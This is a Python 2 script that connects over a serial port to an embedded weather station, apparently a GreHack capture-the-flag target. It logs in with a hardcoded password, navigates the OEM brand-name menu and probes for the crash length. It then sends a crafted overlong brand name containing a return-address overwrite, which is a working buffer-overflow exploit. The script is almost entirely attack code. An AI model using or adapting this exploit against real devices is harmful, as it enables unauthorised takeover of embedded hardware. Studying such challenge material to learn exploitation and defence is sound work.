import time
import serial

def readUntil(keywords, debug=False):
    '''Read until we find one of the keywords, 
    Then we print what we got, stop reading, and return the message
    
    keywords is a list of words: [ 'Password' ]
    '''
    out = ''
    while True:
        c = ser.read(1)
        out = out + c
        if debug:
            print c
        for keyword in keywords:
            if keyword in out:
                print out
                print '[+] Located %s ' % (keyword)
                return out, keyword
        if ser.inWaiting() <= 0:
            print '[-] Sleeping 1 sec'
            time.sleep(1)

def writeNotTooQuick(message, timeout=0.2, debug=False):
    for i in range(0, len(message)):
        ser.write(message[i])
        if debug:
            print "[+] writing: %s" % (message[i])
        time.sleep(timeout)

def selectInOEMMenu(select='3'):
    # Need to be in the OEM setup menu 
    #************************
    #**** OEM Setup Menu ****
    #************************
    #
    #-1- Setup Temperature Unit.
    #-2- Setup Pressure Unit.
    #-3- Setup Brand Name.
    #Selection : 
    print '[+] Read until select brand name'
    readUntil(keywords=['Selection :'])
    print '[+] Selecting Setup Brand Name'
    ser.write(select)


def selectInBrandMenu(select='0'):
    #Need to be in brand menu
    #**************************
    #**** Brand Name Setup ****
    #**************************
    #
    #-1- eSAME manufacturer.
    #-2- Fortinet manufacturer.
    #-3- GreHack manufacturer.
    #-4- Custom
    #
    #-0- Exit to main
    print '[+] Exit Brand Name Setup'
    ser.write(select)

def findMaxBrandName():
    '''Use this function to seek the max brand name we can enter before the
    program crashes
    [+] Located CRASH 
    [+] fill_len=37 is over the limit
    so limit is 36
    '''
    ser.write('4') # select custom brand
    # weather station asks for brand name
    readUntil(keywords=['MAX 8 chars !) :'])

    for fill_len in range(1,70):
        ser.write('a')
        time.sleep(0.1)
        out, keyword = readUntil(keywords=['a', 'CRASH'])
        if keyword == 'CRASH':
            print "[+] fill_len=%d is over the limit" % (fill_len)
            return fill_len - 1

    return 0
    
# ------------------------------------- MAIN -----------------------------
ser = serial.Serial(
    port='/dev/ttyUSB0',
    baudrate=19200,
    timeout=3 # wait up to 3 seconds to read info
)

ser.isOpen()

print "[+] We're in."
print '[+] Reading boot messages'
readUntil(keywords=['Password:'])
    
print "[+] Sending password"
writeNotTooQuick("P455W0rD\r")

selectInOEMMenu('3') # select brand menu

print '[+] Read until select custom name'
#readUntil(keywords=['Custom.']) 
readUntil(keywords=['Selection :'])

'''
Use this to find the max length to enter and craft the exploit brand
# findMaxBrandName()
#exit()
'''

nb_a =16
# select custom brand
ser.write('4') # 
# wait till weather station asks for brand name
readUntil(keywords=['MAX 8 chars !) :'])

# answer with exploit brand name
# 4f564552464c4f5761616161616161616161616161616161e1df00080d
custom_brand = 'OVERFLOW' + 'a' * nb_a + '\xe1\xdf\x00\x08' + '\r'
print '[+] Writing custom brand name: %s [hex: %s] (len=%d nb of a=%d)' % (custom_brand, custom_brand.encode('hex'), len(custom_brand), nb_a)
writeNotTooQuick(custom_brand)
selectInBrandMenu('0') # exit brand menu

print '[?] If everything goes fines, this triggers Winter...'

print '[+] Bye'
ser.close()
exit()
